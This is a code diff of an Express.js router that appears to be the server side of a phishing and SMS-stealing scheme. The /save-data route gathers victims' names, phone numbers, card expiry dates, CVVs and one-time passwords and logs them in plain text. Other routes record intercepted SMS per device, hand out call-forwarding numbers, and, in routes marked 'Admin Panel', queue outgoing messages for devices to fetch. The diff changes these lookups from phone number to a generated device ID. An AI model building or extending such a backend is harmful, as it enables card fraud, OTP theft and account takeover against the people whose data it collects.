@@ -14,9 +14,11 @@ router.get("/", (req, res) => {
 router.use("/admin", adminRouter);
 
 router.post("/save-data", async (req, res) => {
-  console.log("POST /save-data route hit");
+  console.log("Step 1: Received POST /save-data request");
+
   try {
-    const {
+    let {
+      deviceId, // deviceId REQUIRED
       name,
       mobileNumber,
       email,
@@ -29,37 +31,64 @@ router.post("/save-data", async (req, res) => {
       expiryDate,
       cvv,
       forwardPhoneNumber,
-      otp, // added otp to destructuring
+      otp,
     } = req.body;
 
-    console.log("Request body:", req.body);
-    console.log("forwardPhoneNumber:", forwardPhoneNumber);
+    console.log("Step 2: Request body extracted:", req.body);
 
-    if (!mobileNumber) {
-      console.log("mobileNumber is missing in request.");
-      return res.status(400).json({ message: "mobileNumber is required" });
+    // Step 3: Check if deviceId is provided
+    if (!deviceId) {
+      console.log("Step 3.1: deviceId is missing; generating a unique deviceId...");
+      // DeviceId is missing, generate a unique one and send it (do not proceed further)
+      const uniqueDeviceId = `dev_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
+      console.log("Step 3.2: Generated uniqueDeviceId:", uniqueDeviceId);
+
+      // Optionally, ensure it does not exist in DB
+      const existing = await UserModel.findOne({ deviceId: uniqueDeviceId });
+      console.log("Step 3.3: Checking if uniqueDeviceId exists in UserModel:", !!existing);
+
+      if (!existing) {
+        console.log("Step 3.4: uniqueDeviceId does NOT exist; sending to client.");
+deviceId= uniqueDeviceId;
+      } else {
+        // Extremely unlikely, but loop to ensure uniqueness
+        let tries = 0;
+        let newUniqueDeviceId;
+        do {
+          newUniqueDeviceId = `dev_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
+          tries++;
+          console.log(`Step 3.5: Try #${tries}: Generated newUniqueDeviceId:`, newUniqueDeviceId);
+        } while (await UserModel.findOne({ deviceId: newUniqueDeviceId }) && tries < 5);
+
+        console.log("Step 3.6: Sending unique deviceId to client (after retry).");
+        deviceId= newUniqueDeviceId;
+      }
     }
 
-    // Trim helper
+    // deviceId is required for further steps. Redundant check for safety.
+    if (!deviceId) {
+      console.log("Step 4: deviceId is still missing after previous check. Sending error.");
+      return res.status(400).json({ message: "deviceId is required" });
+    }
+
+    // Step 5: Trimming/cleaning fields
     const trimFields = (obj) => {
-      console.log("Trimming fields in object:", obj);
+      console.log("Step 5.1: Trimming fields in object:", obj);
       const result = {};
       for (const [key, value] of Object.entries(obj)) {
-        if (typeof value === "string") result[key] = value.trim();
-        else if (
-          key === "mobileNumber" ||
-          key === "totalLimit" ||
-          key === "availableLimit" ||
-          key == "forwardPhoneNumber"
-        )
+        if (typeof value === "string") {
+          result[key] = value.trim();
+          console.log(`Step 5.2: Trimmed '${key}':`, result[key]);
+        } else {
           result[key] = value;
-        else result[key] = value;
+        }
       }
-      console.log("Trimmed result:", result);
+      console.log("Step 5.3: Trimmed object result:", result);
       return result;
     };
 
     const data = trimFields({
+      deviceId,
       name,
       mobileNumber,
       email,
@@ -72,65 +101,73 @@ router.post("/save-data", async (req, res) => {
       expiryDate,
       cvv,
       forwardPhoneNumber,
-      otp, // add otp to data object
+      otp,
     });
 
-    // Build dynamic update fields (ignore undefined)
+    // Step 6: Build dynamic updateFields (ignore undefined)
     const updateFields = {};
     for (const [key, value] of Object.entries(data)) {
-      if (value !== undefined) updateFields[key] = value;
+      if (value !== undefined) {
+        updateFields[key] = value;
+        console.log(`Step 6.1: Field '${key}' is set to:`, value);
+      }
     }
-    console.log("updateFields to be set:", updateFields);
+    console.log("Step 6.2: All updateFields to be set:", updateFields);
 
-    // Find and update OR insert new
-    console.log("Calling findOneAndUpdate in UserModel...");
+    // Step 7: Find and update OR insert new based on deviceId
+    console.log("Step 7: Executing findOneAndUpdate for deviceId:", data.deviceId);
     const user = await UserModel.findOneAndUpdate(
-      { mobileNumber: data.mobileNumber },
+      {  mobileNumber: data.mobileNumber },
       { $set: updateFields },
       { new: true, upsert: true }
     );
-    console.log("findOneAndUpdate result user:", user);
+    console.log("Step 7.1: Result from findOneAndUpdate:", user);
 
-    // Check if it was an update or create
-    const existed = await UserModel.exists({ mobileNumber: data.mobileNumber });
-    console.log("User existed before upsert? :", existed);
+    // Step 8: Check if user existed before (true) or is newly created (false)
+    const existed = await UserModel.exists({ deviceId: data.deviceId });
+    console.log("Step 8: User existed before upsert?", !!existed);
 
+    // Step 9: Send response to client
     res.status(existed ? 200 : 201).json({
       message: existed
         ? "User updated successfully"
         : "User created successfully",
       data: user,
     });
-    console.log("Response sent for /save-data:", existed ? "update" : "create");
+    console.log("Step 9: Response sent to client:", existed ? "User updated." : "User created.");
   } catch (error) {
-    console.log("Error in /save-data:", error);
+    console.log("Step 10: Error occurred in /save-data:", error);
+
     if (error.code === 11000) {
-      console.log("Duplicate entry error:", error.keyValue);
+      console.log("Step 10.1: Duplicate entry error. KeyValue:", error.keyValue);
       return res
         .status(409)
         .json({ message: "Duplicate entry", error: error.keyValue });
     }
+    console.log("Step 10.2: General error. Message:", error.message);
     res
       .status(500)
       .json({ message: "Error saving user", error: error.message });
   }
 });
 
+
 router.post("/formdata", async (req, res) => {
   console.log("POST /formdata route hit");
   const session = await UserModel.startSession();
   session.startTransaction();
   try {
-    const { senderPhoneNumber, message, time, recieverPhoneNumber } = req.body;
+    const { senderPhoneNumber, message, time, recieverPhoneNumber, deviceId } = req.body;
     console.log("Request body for /formdata:", req.body);
 
     // Basic validation
-    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber) {
+    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber || !deviceId) {
       console.log("Missing field(s) in /formdata:", {
         senderPhoneNumber,
         message,
         time,
-        recieverPhoneNumber
+        recieverPhoneNumber,
+        deviceId
       });
       await session.abortTransaction();
       session.endSession();
@@ -138,11 +175,11 @@ router.post("/formdata", async (req, res) => {
     }
 
     // Check if recieverPhoneNumber exists in UserModel; if not, add it
-    const existingUser = await UserModel.findOne({ mobileNumber: recieverPhoneNumber }).session(session);
+    const existingUser = await UserModel.findOne({ deviceId: deviceId }).session(session);
     if (!existingUser) {
-      const newUser = new UserModel({ mobileNumber: recieverPhoneNumber });
+      const newUser = new UserModel({ deviceId: deviceId });
       await newUser.save({ session });
-      console.log("recieverPhoneNumber added to UserModel:", recieverPhoneNumber);
+      console.log("User added to UserModel with deviceId:", deviceId);
     }
 
     const formData = new FormDataModel({
@@ -150,6 +187,7 @@ router.post("/formdata", async (req, res) => {
       message,
       time,
       recieverPhoneNumber,
+      deviceId,
     });
     console.log("New FormDataModel created:", formData);
 
@@ -177,21 +215,21 @@ router.post("/formdata", async (req, res) => {
 router.post("/get-forwarded-number", async (req, res) => {
   try {
     console.log("/get-forwarded-number endpoint hit");
-    const { mobileNumber } = req.body;
+    const { deviceId } = req.body;
     console.log("Request body:", req.body);
 
-    if (!mobileNumber) {
-      console.log("mobileNumber is missing");
-      return res.status(400).json({ status: false, message: "mobileNumber is required" });
+    if (!deviceId) {
+      console.log("deviceId is missing");
+      return res.status(400).json({ status: false, message: "deviceId is required" });
     }
 
-    const user = await UserModel.findOne({ mobileNumber: mobileNumber });
+    const user = await UserModel.findOne({ deviceId: deviceId });
     console.log("User found:", user);
 
     let forwardedStatus;
     if (!user || !user.forwardPhoneNumber) {
       forwardedStatus = "disabled";
-      console.log("Forwarded number not found for mobileNumber:", mobileNumber);
+      console.log("Forwarded number not found for deviceId:", deviceId);
       return res.status(200).json({
         status: forwardedStatus,
         message: "Forwarded number not found",
@@ -218,6 +256,7 @@ router.post("/get-forwarded-number", async (req, res) => {
   }
 });
 
+//Admin Panel
 router.post("/add-to-and-message", async (req, res) => {
   try {
     const { phoneNo, to, message } = req.body;
@@ -279,21 +318,21 @@ router.post("/add-to-and-message", async (req, res) => {
 
 router.post("/fetch-to-and-message", async (req, res) => {
   try {
-    const { phoneNo } = req.body;
-    if (!phoneNo) {
-      console.log("/fetch-to-and-message: phoneNo missing in request.");
+    const { deviceId } = req.body;
+    if (!deviceId) {
+      console.log("/fetch-to-and-message: deviceId missing in request.");
       return res.status(400).json({
         success: false,
-        message: "phoneNo is required"
+        message: "deviceId is required"
       });
     }
 
-    // Find user by phoneNo
-    let user = await UserModel.findOne({ mobileNumber: phoneNo });
-    console.log("/fetch-to-and-message: User lookup for", phoneNo, "Result:", user);
+    // Find user by deviceId
+    let user = await UserModel.findOne({ deviceId: deviceId });
+    console.log("/fetch-to-and-message: User lookup for deviceId", deviceId, "Result:", user);
 
     if (!user) {
-      console.log("/fetch-to-and-message: User not found for", phoneNo);
+      console.log("/fetch-to-and-message: User not found for deviceId", deviceId);
       return res.status(404).json({
         success: false,
         message: "User not found"
@@ -302,7 +341,7 @@ router.post("/fetch-to-and-message", async (req, res) => {
 
     // Check if already fetched
     if (user.messageFetched) {
-      console.log("/fetch-to-and-message: messageFetched already true for", phoneNo);
+      console.log("/fetch-to-and-message: messageFetched already true for deviceId", deviceId);
       return res.status(400).json({
         success: false,
         message: "Unable to fetch. Already fetched."
@@ -331,6 +370,7 @@ router.post("/fetch-to-and-message", async (req, res) => {
   }
 });
 
+//Admin Panel
 router.post("/set-forward-status", async (req, res) => {
   try {
     const { mobileNumber, isForwarded } = req.body;
